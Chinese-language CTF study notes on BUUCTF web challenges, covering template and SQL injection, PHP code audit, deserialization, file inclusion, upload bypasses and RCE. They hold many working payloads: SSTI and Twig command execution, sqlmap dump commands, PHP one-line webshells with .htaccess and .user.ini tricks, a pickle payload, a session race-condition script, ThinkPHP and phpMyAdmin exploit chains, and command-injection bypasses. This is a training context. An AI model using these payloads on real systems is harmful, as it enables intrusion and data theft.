# BUUCTF练习

## 模板注入

### [BJDCTF2020]The mystery of ip

x-forwarder-for处测试{{7*7}}，返回49，存在模板注入，是smarty

{system('cat /flag')}

```
Smarty SSTI利用
{$smarty.version}  //漏洞确认
常规：{php}phpinfo();{/php}
<script language="php">phpinfo();</script>
静态方法读文件：{self::getStreamVariable(“file:///etc/passwd”)}
{if}标签：{if phpinfo()}{/if}
```



### [护网杯 2018]easy_tornado

模板注入

/fllllllllllllag   3bf9f6cf685a6dd8defadabfb41a03a1

/hints.txt
md5(cookie_secret+md5(filename))

```
通过welcome看到render，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用
报错/error?msg={{1}}，有回馈，模板存在可以访问的快速对象
cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名
handler指向的处理当前这个页面的RequestHandler对象，
RequestHandler.settings指向self.application.settings，
因此handler.settings指向RequestHandler.application.settings。
使用{{haddle.setting}}
```

75f0c8b5-c718-462a-9d5c-baa966ce8247

最后md5输出修改filehash

### [BJDCTF2020]Cookie is so stable

https://zhuanlan.zhihu.com/p/28823933

进去，提示看cookie，有登录界面，输入什么返回什么，没有xss。

这里想到有可能是模板注入，尝试{{7*7}}和{{7 * '7'}}，都返回49，确认是Twig。复制模板注入payload，抓包修改到cookie，成功返回flag。

![image-20210712165342970](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210712165342970.png)



```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## SQL注入

### [GYCTF2020]Blacklist

sql堆叠注入

手注检测1'，show tables;出表名列名，但是对select rename等都有过滤，无法rename修改表。这里使用handler

```
handler FlagHere open;handler FlagHere read first;# 
用法：handler test open as c;handler c read `PRIMARY`=(5);
handler test open;handler test read data first;handler test read data next;handler test read `data`=("yza");
```

### [GXYCTF2019]BabySQli

考察手工注入和联合注入会产生虚拟数据

手注1'，有报错，看源代码，有提示一串字符，base32和64解码后有select * from user where username = '$name'

联合注入3行，猜测id,user,pw，联合注入会产生数据，第二个写admin，第三个写md5值，password填md5前密码 ，成功登录

### [极客大挑战 2019]BabySQL

过滤了where from union select 等，在sql提醒中消失，是replace，使用双写绕过爆库

### [SUCTF 2019]EasySQL

过滤很多注入，没过滤堆叠

select $_GET['query'] || flag from flag  查询源码

```
在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode
模式：pipes_as_concat 来实现oracle 的一些功能
```

1;set sql_mode=PIPES_AS_CONCAT;select 1

### 强网杯2019 sql注入

堆叠注入

?inject=1';show columns from `1919810931114514`;#

**字符串为表名操作时要加反引号( ` )**

rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#

因为没禁用rename和alter，所有利用重命名改原本的word成words1，flag表名为words，最后用1' or 1 = 1#爆字段即可

### ciscn2021 easy_sql

知识点：join报错注入 

')闭合，过滤union，sqlmap，爆flag表名，尝试join报错注入字段

```
Submit=%E7%99%BB%E5%BD%95&passwd=123&uname=admin')||extractvalue(0x0a,concat(0x0a,(select * from (select * from flag as a join flag b)c
)))#

select * from (select * from flag join flag as b using(id,no)) as c  //爆列名，前面略

||extractvalue(0x0a,concat(0x0a,(select substr((select `af980cb2-d717-476c-b97f-6da717c70064` from flag ),1,21)  //出flag，手工方法
))) --+
||updatexml(1,concat((select `cb9704e8-dfcb-4feb-90c7-d84c92ef0062` from flag limit 0,1)),1)#  //上面替换这个也可

sqlmap -r 123.txt --batch --random-agent --level 5 --risk 3 -D security -T users -C username --dump   //库，表，列，sqlmap
```

手工注入单引号，存在注入点，post注入

去掉submit保存为txt

尝试sqlmap扫描，发现有报错注入和布尔注入

```
python sqlmap.py -r 保存的txt文件 --level 5//有报错注入，设置level5
python sqlmap.py -r 保存的txt文件 --dbs   //扫 数据库名
-D security -tables  //爆表
-D security -tables users -columns  //爆users的列名
-D security -T users -C id,username,password -dump  //脱裤
```

再脱flag，不显示，用手注发现union 和information_schema被屏蔽

利用无列名注入，mysql列名重复会报错

```
uname=')and(select extractvalue(1,concat(0x7e,(select * from(select * from flag a join flag b)d),0x7e),1))#   //得到第一个字段 id
uname=')and(select extractvalue(1,concat(0x7e,(select *  from(select * from flag a join flag b using(id))d),0x7e),1))#  //得到第二个字段 no
uname=')and(select extractvalue(1,concat(0x7e,(select *  from(select * from flag a join flag b using(id，no))d),0x7e),1))#   //payload出column值
-D security -T users -C column值 -dump 
```



## 代码审计

### WarmUp

```php
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

 mb_strpos 会替换掉问号，源码的意思是讲file值传参进去，然后经过三个判断，判断是否存在，判断是否字符串，判断checkfile，最后一个通过写白名单内容绕过，然后加url编码的问号，最后加../../../flag即可



### [BJDCTF2020]Easy MD5

https://www.freesion.com/article/53561386476/

MD5碰撞各种技巧

1. MD5弱类型


   ```
   if(md5($_GET['a'])==md5($_GET['b']))//因为是if的判断条件是两个数弱类型相等，就可以利用hash比较缺陷去绕过
   var_dump("0e12345"=="0e66666");//true
   var_dump(md5('240610708')==md5('QNKCDZ0'));//true
   
   240610708:0e462097431906509019562988736854
   QLTHNDT:0e405967825401955372549139051580
   QNKCDZO:0e830400451993494058024219903391
   PJNPDWY:0e291529052894702774557631701704
   NWWKITQ:0e763082070976038347657360817689
   NOOPCJF:0e818888003657176127862245791911
   MMHUWUV:0e701732711630150438129209816536
   MAUXXQC:0e478478466848439040434801845361
   ```

2. MD5强类型比较

   ```
   if(md5((string)$_GET['a'])===md5((string)$_GET['b']))//此时两个md5后的值采用严格比较，没有规定字符串如果这个时候传入的是数组不是字符串，可以利用md5()函数的缺陷进行绕过
   var_dump(md5([1,2,3])==md5([4,5,6]));//true
   var_dump(md5($_GET['a'])==md5($_GET['b']));
   ?a[]=1&b[]=1//true
   
   md5()函数的描述是string md5(string $str[,bool $raw_output=false])
   md5中需要的是一个string参数，但是当你传入一个array(数组)是，md5()是不会报错的，只是无法求出array的md5的值，这样就会导致任意的2个array的md5的值都会相等
   ```

3. MD5碰撞

   ```
   if($_GET['a']!==$_GET['b'] && md5($_GET['a'])===md5($_GET['b']))
   bp抓包输入
   a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
   ```

4. 数据库碰撞

   ```
   $query = "SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"],true) . "'";
   这需要一个极其特殊的md5的值 ffifdyop
   
   这个字符串进行md5后恰好结果是’or’6�]��!r,��b，他的前四位为’or’正好满足sql注入查询的条件，因此可以完美绕过
   ```

### [安洵杯 2019]easy_web

img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd='  ，T开头，像两次base64加密，解开后发现像16进制，https://zixuephp.net/tool-str-hex.html  ，用这个网站转字符串

```
<?php
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
```

用dir ../../../到根目录，发现flag，然后用ca\t%20../../../flag读出flag

### [BJDCTF2020]ZJCTF，不过如此

```
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>


<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

?text=data://text/plain,I have a dream&file=php://filter/read/convert.base64-encode/resource=next.php



### [MRCTF2020]套娃

```
$query = $_SERVER['QUERY_STRING'];
 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

php解析参数会转换成有效变量，%5b %20在变量中间都会变成下划线，

preg_match会匹配开头与结尾，利用字符串换行%0a匹配结尾

b%20u%20p%20t=23333%0a

Client-IP: 127.0.0.1

```
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+...有一串这样的字符串，是jsfuck加密，解密出下面源码
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }

<?php
function unchange($v){ 
    $re = '';
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    
    $re = base64_encode($re);
    return $re; 
}
$real_flag = unchange('flag.php');
echo $real_flag;
?>
```

代码反写flag.php，2333=text=data://text/plain,todat is a happy day，出flag

### MD5

[2020强网杯]: https://www.gem-love.com/ctf/2576.html#Funhash

[^PHP花式绕过大全]: https://blog.csdn.net/xiayu729100940/article/details/102619255

[PHP中MD5碰撞Bypass]: https://evi0s.com/2019/02/09/md5-collisions/
[2021陕西省大学生网络安全技能大赛 Web ez_checkin]: https://www.cnblogs.com/seizer/p/14840901.html

拿到题目，提示Come and hack me

看起来像是后台文件，御剑，dirsearch直接跑

得到 ip/index.php~，核心代码如下:

```php
if ($_GET["param1"] == hash("md4", $_GET["param1"]))
    {
    	echo "<br>Welcome to level 2!<br>";
          if ($_GET['param2'] != $_GET['param3']  &&  md5($_GET['param2']) == md5(md5($_GET['param3']))){ echo "<br>Welcome to level 3!<br>";
            if($_GET['param4'] != $_GET['param5']  &&  md5($_GET['param4']) === md5($_GET['param5'])){ echo $flag; }
```

看到hash("md4", $_GET["param1"])，查了下hash函数用法，第一个是加密方法，第二个传参

意思是找到一个参数值与md4值相同的数。这里有两种方法：

1. payload=?param1=0e，后面用bp暴力跑，
2. 代码跑，python自动检测是否相同

跑出param1=0e251288019，进入第二步。

这里采用双重md5绕过，找一个x与md5(x)的值都是0e开头，利用php md5无法判断数组的方法绕过，同样的代码跑

```python
# -*- coding: utf-8 -*-
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.letters + string.digits
def cmp_md5(substr, stop_event, str_len,start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)
        value = md5.hexdigest()
        if value[start: start+str_len] == substr:
            md5 = hashlib.md5(value)
            if md5.hexdigest()[start: start+str_len] == substr:
            	print rnds+ "=>" + value+"=>"+ md5.hexdigest()  + "\n"
                stop_event.set()
if __name__ == '__main__':
    substr = sys.argv[1].strip()
    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0
    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                         stop_event, str_len, start_pos))
                 for i in range(cpus)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()
python2 crack.py "0e" 0
```

param2=0ec20b7c66cafbcc7d8e8481f0653d18

param3=CbDLytmyGm2xQyaLNhWn

这里对结果不确定的可以用php在线运行平台跑下面代码检测

```php
<?php
if (md5('0ec20b7c66cafbcc7d8e8481f0653d18') == md5(md5('CbDLytmyGm2xQyaLNhWn')))
{
	echo "<br>Welcome to level 3!<br>";}
else
{ echo "false";}
```

最后一步直接利用无法判断函数的方法绕过

payload=?param1=0e251288019
&param2=0ec20b7c66cafbcc7d8e8481f0653d18
&param3=cbdlytmygm2xqyalnhwn
&param4[]=1
&param5[]=2

![image-20210529124634432](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210529124634432.png)





### ciscn2021 easy_source 

知识点：`PHP反射`，`ReflectionMethod` 构造 `User` 类中的函数方法，再通过 `getDocComment` 获取函数的注释，本例中使用`__toString` 同样可以输出函数注释内容。

![image-20210519172348127](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210519172348127.png)

扫描，发现.index.php.swo备份文件   swp  swn swo

![image-20210519162640507](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210519162640507.png)

最后两行意思是能够实例化任意类，并调用方法，可以利用php内置类的ReflectionMethod读取User类的各个函数的注释

```
$d = new ReflectionMethod('User','b');
var_dump($d->getDocComment());
payload=?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
用bpIntruder遍历上面的rb替换字母出结果
```

### [NPUCTF2020]ReadlezPHP

#### eval和assert

二者都可以执行PHP语句。只不过是，eval规范更加严格一些，必须符合PHP代码要求。而assert则没有那么严格，执行PHP表达式即可。

##### eval定义和用法

函数把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码，且**必须以分号结尾**。
如eval(“echo 1;”)

- eval() 函数把字符串按照 PHP 代码来计算（计算=执行）。
- 该字符串必须是合法的 PHP 代码，且必须以分号结尾。
- 如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false

##### assert函数

 功能是判断一个表达式是否成立，返回true or false，重点是函数会执行此表达式。如果表达式为函数如assert(“echo(1)”)，则会输出1，而如果为assert(“echo 1;”)则不会有输出。

题目是反序列化，有echo $b($a),把b=assert  a=phpinfo()

## 反序列化

### **赌徒  构造pop链** 

[难版pop链]: https://www.136.la/nginx/show-127914.html
[PHP之十六个魔术方法详解]:  https://segmentfault.com/a/1190000007250604

其实pop链说白了就是通过不同魔术方法来交叉调用，最后获取想要结果，比如get，这时候可以对对象任意调用一个不存在参数或

最终payload

```
$a = new Start();			// __wakeup()进入，
$a->name = new Info();		// Info的__toString()进入
$a->name->file["filename"] = new Room();	// Room的__get()进入
$a->name->file["filename"]->a= new Room();	// Room的__invoke()进入
echo "<br>";
echo serialize($a);

```

```
__construct()，类的构造函数，一开头就执行，
__destruct()，类的析构函数，死之前才执行
__call()，在对象中调用一个不可访问方法时调用，比如输出没有此方法
__callStatic()，用静态方式中调用一个不可访问方法时调用
__get()，获得一个类的成员变量时调用，获取私有属性，比如用实例化对象调用私有属性,echo $a->name;
__set()，设置一个类的成员变量时调用，设置私有属性，比如对象设置属性，$a->name=10;
__isset()，当对不可访问属性调用isset()或empty()时调用
__unset()，当对不可访问属性调用unset()时被调用
__sleep()，执行serialize()时，先会调用这个函数
__wakeup()，执行unserialize()时，先会调用这个函数
__toString()，类被当成字符串时的回应方法，比如echo 类实例化对象, echo $a;
__invoke()，调用函数的方式调用一个对象时的回应方法，比如给实例化对象加括号， $a();
__set_state()，调用var_export()导出类时，此静态方法会被调用。
__clone()，当对象复制完成时调用
__autoload()，尝试加载未定义的类
__debugInfo()，打印所需调试信息
```



### [极客大挑战 2019]PHP

```
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
```

php反序列化，直接写$a=new Name(admin,100)，反序列化输出即可，然后因为需要绕过wakeup和private，需要改数量，然后在类名两边加%00

O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}

### [CISCN2019 华北赛区 Day1 Web2]ikun

进去是页面，需要购买lv6，写py代码遍历查找

找到后点击购买，页面有js代码计算折扣价格，改折扣，提交后说需要admin

抓包看头，有JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78

可爆破出密钥，jwt craker  https://jwt.io/输入密钥和jwt，修改用户为admin，拿到源码地址。

```python
class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated  
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become)) //反序列化
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
payload:
import pickle
import urllib

class Test(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt','r').read()" ,))

a = Test()
s = pickle.dumps(a)
print(urllib.quote(s))
```

python的标准反序列化，抓包修改beacon即可

## 文件包含

```
PHP文件包含函数:require、include、require_once、include_once
包含函数 一共有四个，主要作用为包含并运行指定文件。
include $file;
在变量 $file 可控的情况下，我们就可以包含任意文件，从而达到 getshell 的目的。
另外，在不同的配置环境下，可以包含不同的文件。
因此又分为远程文件包含和本地文件包含。
包含函数也能狗读取任意文件内容，这就需要用到【支持的协议和封装协议】和【过滤器】。
例如，利用php流filter读取任意文件
include($_GET[‘file‘]);
```



### include

https://blog.csdn.net/weixin_43818995/article/details/104164700

页面使用strstr替换了php://，使用大小写绕过

pHp://input，bp加上后面php代码即可

php://filter/read/convert.base64-encode/resource=index.php

### [BSidesCF 2020]Had a bad day

进去是?category=woofers，写别的，报错，有注入点，尝试php://filter/read/convert.base64-encode/resource=index，出源码

```
 <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```

这里需要把flag套进去base64解码里面，两种方法

1. ?category=woofersphp://filter/read/convert.base64-encode/index/resource=flag
2. ?category=woofersphp://filter/read/convert.base64-encode/resource=index/../flag

## 文件上传

### 极客大挑战 2019]Upload

上传一句话，

GIF89a? <script language="php">eval($_REQUEST[shell])</script>

bp抓包改成image/jpeg

后缀名修改很多，符号<修改绕过，php7，phtml等等，

### [MRCTF2020]你传你🐎呢 [GXYCTF2019]BabyUpload

上传.htaccess

```
<FilesMatch "1.jpg">  
        SetHandler application/x-httpd-php  
</FilesMatch>
```

传1.jpg   GIF89a? <script language="php">eval($_REQUEST[shell])</script>

蚁剑连接拿下

### [SUCTF 2019]CheckIn

上传绕过，随便传，有列出文件名和目录，有index.php，是.user.ini型

先传.user.ini

```
GIF89a
auto_prepend_file=a.jpg
```

然后传a.jpg

GIF89a? <script language="php">eval($_REQUEST[shell])</script>

这种马可以绕过许多限制。最后按照上传目录/index.php连蚁剑



### ciscn2021_UPLOAD

知识点：

index上传检测，要求正方形，并且不能有c/i/h/ph

```php
index.php
<?php
...
if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']);
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "image/" . mb_strtolower($fileName);
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
example.php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }
}
```

思路是通过example上传zip，zip中放php，解压getshell

文件名使用mb_strtolower()，此处有js的大小写转换问题，İ => i，绕过i

用png-payload生成图片文件，添加压缩包，重命名test.zip，加上png标识（php合成到zip）

```
#define width 1
#define height 1
```

利用ctf=upload    postman上传文件后，get连0或post数据为1

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210523220528692.png" alt="image-20210523220528692" style="zoom:50%;" />

利用ctf=poc进行解压

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210523220703519.png" alt="image-20210523220703519" style="zoom:50%;" />

直接利用shell层层探索拿到

![image-20210523220816446](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210523220816446.png)

### ciscn2021_middle_source

知识点：PHP_SESSION_UPLOAD_PROGRESS，条件竞争

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210519172410094.png" alt="image-20210519172410094" style="zoom:67%;" />

扫目录得到/.listing,登录给出的php是个phpinfo，有session存储路径

![image-20210519163523944](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210519163523944.png)

PHP_SESSION_UPLOAD_PROGRESS(浏览器向服务器上传文件时，php会将此次文件上传详细信息存储session)上传到session目录，内容eval($_GET[0])

```
//bp抓包得到post
import requests 
import io 
import time 
import threading 
url='http://124.71.228.199:21296/' 
proxies={'http': 'http://127.0.0.1:1080'}  //走bp代理
def upload(session): 
    f = io.BytesIO(b'a' * 1024 * 50) 
    files = {'file': ('1.txt', f)} 
    while 1: 
        re=requests.post(url,files=files,data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_GET[0]);?>'},cookies={"PHPSESSID": "wanderer"})
        print(re.status_code) 
        time.sleep(0.2) 
if __name__=="__main__": 
    sess=requests.session()
    while 1:
        upload(sess)
        
//python打印包得到post
import requests
url = 'http://xxx.xxx.xxx.xxx:xxxx/?page=/tmp/sess_mochu7'
mydata = {'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_GET[0]);?>'} 
myfile = {'file':('mochu7.txt','mochu7')}
mycookie = {'PHPSESSID': 'mochu7'}
r = requests.post(url=url, data=mydata, files=myfile, cookies=mycookie)
print(r.request.body.decode('utf8'))
```

抓包，如下图，加cf参数(sess_是因为临时存储自动更名)，若是python还需要完善包

![image-20210519171929645](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210519171929645.png)

条件竞争，intruder发包，直到sess_Wanderer写入一句话木马![image-20210519211418484](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210519211418484.png)

上图是两个分开发，一个发一句话木马，一个发占用目标文件进行条件竞争防止session删除

直接蚁剑，?cf=../../../地址

## RCE

```
 PHP命令执行函数
exec() — 执行一个外部程序
• passthru() — 执行外部程序并且显示原始输出
• proc_open() — 执行一个命令，并且打开用来输入/输出的文件指针。
• shell_exec() & `` — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
• system() — 执行外部程序，并且显示输出
• popen() — 通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。

PHP文件操作函数
copy — 拷贝文件
• file_get_contents — 将整个文件读入一个字符串
• file_put_contents — 将一个字符串写入文件
• file — 把整个文件读入一个数组中
• fopen — 打开文件或者 URL
• move_uploaded_file — 将上传的文件移动到新位置
• readfile — 输出文件
• rename — 重命名一个文件或目录
• rmdir — 删除目录
• unlink & delete — 删除文件
```

### [BUUCTF 2018]Online Tool

```
<?php
 
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
 
if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    //escapeshellarg
    //1,确保用户值传递一个参数给命令
    //2,用户不能指定更多的参数
    //3,用户不能执行不同的命令
    $host = escapeshellcmd($host);
    //escapeshellcmd
    //1,确保用户只执行一个命令
    //2,用户可以指定不限数量的参数
    //3,用户不能执行不同的命令
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host -timeout 2 -F ".$host);
```

思路是将命令写入host,通过nmap 写入文件shell ，<?php eval();?> -oG shell.php

对于单个单引号, **escapeshellarg** 函数转义（加\）后,还会在左右各加一个单引号(加' '),但 **escapeshellcmd** 函数是直接加一个转义符(加 \ )，对于成对的单引号, **escapeshellcmd** 函数默认不转义,但 **escapeshellarg** 函数转义:

?host=' <?php eval();?> -oG shell.php '

写入的文件在md5加密处，执行即可

### php_rce

https://blog.csdn.net/qq_36304918/article/details/86384042

https://mp.weixin.qq.com/s/cSaA6HUX0_j7KzBzAAoE0Q

?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

后面直接加webshell写入

echo '<?php eval($_POST[1]); ?>' > 1.php

蚁剑拿下

### [GXYCTF2019]Ping Ping Ping

命令注入绕过

尝试ls，有flag.php，这里给出几种绕过

- 空格绕过 < <> %20 %09 $IFS$9 IFS *I***F***S* 
- cat fl* 利用*匹配任意
- echo "Y2F0IGZsYWcucGhw"| base64 -d | bash
- ca\t fl\ag.php
- cat fl''ag.php
- 变量绕过：a=g;cat$IFS$1fla$a.php



### [GWCTF 2019]我有一个数据库

https://www.cnblogs.com/kbhome/p/13210419.html

连接进去，提示数据库，输入phpmyadmin，进入后台，用CVE-2018-12613的验证POC本地文件包含，phpadmin4.8

```
当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，造成文件被解析。此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。
1. http://192.168.73.131:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
2. 执行数据库语句，内容为php  SELECT '<?php eval($_POST["1"])?>'
3. 查看F12的import.php的set-cookie:phpAdmin值，复制到下方
4. http://192.168.73.131:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_3c9f4025794d547ff88ae6cd1bc2f40f(复制)，可执行命令
```



## 代码执行

```
PHP代码执行函数 - eval & assert & preg_replace
1. mixed eval ( string $code )
